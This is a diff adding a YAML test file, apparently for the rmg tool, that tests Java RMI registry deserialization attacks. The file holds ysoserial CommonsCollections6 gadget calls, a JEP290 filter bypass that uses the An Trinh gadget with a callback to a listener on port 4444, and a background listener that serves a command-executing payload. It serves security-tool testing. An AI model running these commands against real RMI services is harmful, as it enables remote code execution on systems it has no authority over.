@@ -1,0 +1,110 @@
+tester:
+  title: Registry Tests
+  description: |-
+    'Perform tests for the serial action on an RMI registry endpoint.'
+
+  id: '002-010'
+  groups:
+    - reg
+    - serial
+  id_pattern: '002-010-{:03}'
+
+
+variables:
+  file: jdk9-reg-bypass.txt
+
+
+plugins:
+  - os_command:
+      init: 1
+      background: True
+      cmd:
+        - rmg
+        - listen
+        - 0.0.0.0
+        - 4444
+        - CommonsCollections6
+        - 'touch ${volume-d}/${file}'
+
+
+tests:
+  - title: Gadget Call
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should fail, as the server has JEP290 installed.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
+      - CommonsCollections6
+      - ls
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Registry rejected deserialization
+            - The supplied gadget did not pass the deserialization filter
+
+
+  - title: Gadget Call (SSL)
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should fail, as the server has JEP290 installed.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET-SSL}
+      - CommonsCollections6
+      - ls
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Registry rejected deserialization
+            - The supplied gadget did not pass the deserialization filter
+
+
+  - title: JEP290 Bypass
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint,'
+      'using the An Trinh bypass gadget.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
+      - AnTrinh
+      - ${DOCKER-GW}:4444
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - BadAttributeValueExpException
+            - worked anyway
+      - file_exists:
+          cleanup: True
+          files:
+            - ${volume}/${file}
